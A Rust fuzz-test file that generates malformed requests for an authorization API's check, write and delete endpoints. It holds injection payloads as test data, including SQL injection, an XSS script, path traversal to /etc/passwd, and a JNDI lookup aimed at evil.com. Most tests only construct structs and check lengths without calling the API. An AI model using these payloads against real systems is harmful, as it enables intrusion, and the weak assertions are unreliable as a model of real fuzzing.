//! API Endpoint Fuzzing Tests
//!
//! These tests use property-based testing to fuzz API endpoints with random inputs,
//! ensuring robustness against malformed requests, edge cases, and potential security issues.

use infera_api::grpc::proto::{
    CheckRequest as ProtoCheckRequest, DeleteRequest, Tuple as ProtoTuple, WriteRequest,
};
use proptest::prelude::*;

/// Generate arbitrary strings with various problematic characters
fn arb_string() -> impl Strategy<Value = String> {
    prop_oneof![
        // Normal strings
        "[a-zA-Z0-9_:-]{1,100}",
        // Empty string
        Just(String::new()),
        // Very long strings
        prop::collection::vec(any::<char>(), 1000..2000).prop_map(|v| v.into_iter().collect()),
        // Strings with special characters
        "[!@#$%^&*(){}\\[\\];:'\"<>,.?/|\\\\]{1,50}",
        // Unicode strings
        "\\PC{1,50}",
        // SQL injection attempts
        Just("'; DROP TABLE users; --".to_string()),
        Just("1' OR '1'='1".to_string()),
        // XSS attempts
        Just("<script>alert('xss')</script>".to_string()),
        // Path traversal attempts
        Just("../../../etc/passwd".to_string()),
        Just("..\\..\\..\\windows\\system32".to_string()),
        // Null bytes and control characters
        prop::collection::vec(0u8..32u8, 1..20)
            .prop_map(|v| { String::from_utf8(v).unwrap_or_else(|_| String::from("invalid")) }),
    ]
}

/// Generate arbitrary tuples for fuzzing
fn arb_tuple() -> impl Strategy<Value = ProtoTuple> {
    (arb_string(), arb_string(), arb_string()).prop_map(|(object, relation, user)| ProtoTuple {
        object,
        relation,
        user,
    })
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(100))]

    /// Fuzz CheckRequest with arbitrary inputs
    #[test]
    fn fuzz_check_request(
        subject in arb_string(),
        resource in arb_string(),
        permission in arb_string(),
    ) {
        // Create a check request with fuzzed inputs
        let request = ProtoCheckRequest {
            subject,
            resource,
            permission,
            context: None,
        };

        // The request should be constructible without panicking
        // Validation errors are acceptable, panics are not
        assert!(request.subject.len() <= 10000);
        assert!(request.resource.len() <= 10000);
        assert!(request.permission.len() <= 10000);
    }

    /// Fuzz WriteRequest with arbitrary tuples
    #[test]
    fn fuzz_write_request(tuples in prop::collection::vec(arb_tuple(), 0..100)) {
        // Create a write request with fuzzed tuples
        let request = WriteRequest {
            tuples: tuples.clone(),
        };

        // Should construct without panicking
        assert!(request.tuples.len() <= 100);

        // Each tuple should have reasonable field sizes
        for tuple in &request.tuples {
            assert!(tuple.object.len() <= 10000);
            assert!(tuple.relation.len() <= 10000);
            assert!(tuple.user.len() <= 10000);
        }
    }

    /// Fuzz DeleteRequest with arbitrary tuples
    #[test]
    fn fuzz_delete_request(tuples in prop::collection::vec(arb_tuple(), 0..100)) {
        // Create a delete request with fuzzed tuples
        let request = DeleteRequest {
            tuples: tuples.clone(),
        };

        // Should construct without panicking
        assert!(request.tuples.len() <= 100);

        // Each tuple should have reasonable field sizes
        for tuple in &request.tuples {
            assert!(tuple.object.len() <= 10000);
            assert!(tuple.relation.len() <= 10000);
            assert!(tuple.user.len() <= 10000);
        }
    }

    /// Fuzz request with very long field values
    #[test]
    fn fuzz_long_fields(length in 0usize..10000) {
        let long_string = "a".repeat(length);

        let request = ProtoCheckRequest {
            subject: long_string.clone(),
            resource: long_string.clone(),
            permission: long_string,
            context: None,
        };

        // Should construct without panicking
        assert_eq!(request.subject.len(), length);
    }

    /// Fuzz with nested object references
    #[test]
    fn fuzz_nested_references(depth in 0usize..20) {
        let mut object = String::from("root");
        for i in 0..depth {
            object = format!("{}:level{}", object, i);
        }

        let request = ProtoCheckRequest {
            subject: "user:test".to_string(),
            resource: object.clone(),
            permission: "viewer".to_string(),
            context: None,
        };

        // Should construct without panicking
        assert!(request.resource.contains("root"));
    }

    /// Fuzz with special characters in identifiers
    #[test]
    fn fuzz_special_chars(special in "[!@#$%^&*(){}\\[\\];:'\"<>,.?/|\\\\]{1,20}") {
        let request = ProtoCheckRequest {
            subject: format!("user:{}", special),
            resource: format!("doc:{}", special),
            permission: special,
            context: None,
        };

        // Should construct without panicking
        assert!(!request.subject.is_empty());
    }

    /// Fuzz batch operations with varying sizes
    #[test]
    fn fuzz_batch_size(count in 0usize..1000) {
        let tuples: Vec<ProtoTuple> = (0..count)
            .map(|i| ProtoTuple {
                object: format!("obj{}", i),
                relation: "rel".to_string(),
                user: format!("user{}", i),
            })
            .collect();

        let request = WriteRequest {
            tuples: tuples.clone(),
        };

        // Should construct without panicking
        assert_eq!(request.tuples.len(), count);
    }

    /// Fuzz with Unicode characters
    #[test]
    fn fuzz_unicode(unicode in "\\PC{1,50}") {
        let request = ProtoCheckRequest {
            subject: format!("user:{}", unicode),
            resource: format!("doc:{}", unicode),
            permission: "viewer".to_string(),
            context: None,
        };

        // Should handle Unicode gracefully
        assert!(!request.subject.is_empty());
    }

    /// Fuzz with potential injection patterns
    #[test]
    fn fuzz_injection_patterns(pattern in prop_oneof![
        Just("'; DROP TABLE relationships; --"),
        Just("1' OR '1'='1"),
        Just("<script>alert('xss')</script>"),
        Just("${jndi:ldap://evil.com/a}"),
        Just("../../etc/passwd"),
        Just("\\x00\\x01\\x02"),
    ]) {
        let request = ProtoCheckRequest {
            subject: pattern.to_string(),
            resource: pattern.to_string(),
            permission: pattern.to_string(),
            context: None,
        };

        // Should construct without panicking (validation can reject, but no crashes)
        assert!(request.subject.len() < 1000);
    }

    /// Fuzz with whitespace and empty strings
    #[test]
    fn fuzz_whitespace(ws in prop_oneof![
        Just(""),
        Just(" "),
        Just("  "),
        Just("\t"),
        Just("\n"),
        Just("\r\n"),
        Just("   \t\n\r  "),
    ]) {
        let request = ProtoCheckRequest {
            subject: ws.to_string(),
            resource: ws.to_string(),
            permission: ws.to_string(),
            context: None,
        };

        // Should construct without panicking
        // Empty fields might be invalid, but shouldn't crash
        prop_assert!(request.subject.len() < 100);
    }

    /// Fuzz with mixed valid and invalid tuples
    #[test]
    fn fuzz_mixed_tuples(
        valid_count in 0usize..50,
        invalid_count in 0usize..50,
    ) {
        let mut tuples = Vec::new();

        // Add valid tuples
        for i in 0..valid_count {
            tuples.push(ProtoTuple {
                object: format!("doc:{}", i),
                relation: "viewer".to_string(),
                user: format!("user:{}", i),
            });
        }

        // Add potentially invalid tuples
        for i in 0..invalid_count {
            tuples.push(ProtoTuple {
                object: format!("!@#{}", i),
                relation: "".to_string(),
                user: ";;;".to_string(),
            });
        }

        let request = WriteRequest {
            tuples,
        };

        // Should construct without panicking
        assert_eq!(request.tuples.len(), valid_count + invalid_count);
    }

    /// Fuzz with extremely nested field separators
    #[test]
    fn fuzz_field_separators(sep_count in 0usize..100) {
        let separators = ":".repeat(sep_count);
        let request = ProtoCheckRequest {
            subject: format!("user{}", separators),
            resource: format!("doc{}", separators),
            permission: "viewer".to_string(),
            context: None,
        };

        // Should construct without panicking
        assert_eq!(request.subject.matches(':').count(), sep_count);
    }
}

/// Integration test: Verify API handles fuzzed inputs gracefully
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_api_resilience_to_malformed_input() {
        // Create various malformed requests
        let malformed_requests = vec![
            ProtoCheckRequest {
                subject: "".to_string(),
                resource: "".to_string(),
                permission: "".to_string(),
                context: None,
            },
            ProtoCheckRequest {
                subject: "a".repeat(10000),
                resource: "b".repeat(10000),
                permission: "c".repeat(10000),
                context: None,
            },
            ProtoCheckRequest {
                subject: "user:alice".to_string(),
                resource: "../../../etc/passwd".to_string(),
                permission: "'; DROP TABLE users; --".to_string(),
                context: None,
            },
        ];

        // All requests should be constructible
        for req in malformed_requests {
            assert!(req.subject.len() <= 10000);
            assert!(req.resource.len() <= 10000);
            assert!(req.permission.len() <= 10000);
        }
    }

    #[test]
    fn test_tuple_validation_resilience() {
        // Create tuples with problematic data
        let problematic_tuples = vec![
            ProtoTuple {
                object: "\0\0\0".to_string(),
                relation: "rel".to_string(),
                user: "user".to_string(),
            },
            ProtoTuple {
                object: "<script>".to_string(),
                relation: "../../".to_string(),
                user: "'; DROP--".to_string(),
            },
        ];

        // Should construct without crashing
        for tuple in problematic_tuples {
            assert!(!tuple.object.is_empty());
        }
    }

    #[test]
    fn test_batch_operation_limits() {
        // Test with maximum reasonable batch size
        let large_batch: Vec<ProtoTuple> = (0..10000)
            .map(|i| ProtoTuple {
                object: format!("obj{}", i),
                relation: "rel".to_string(),
                user: format!("user{}", i),
            })
            .collect();

        let request = WriteRequest {
            tuples: large_batch,
        };

        // Should construct without panicking
        assert_eq!(request.tuples.len(), 10000);
    }
}
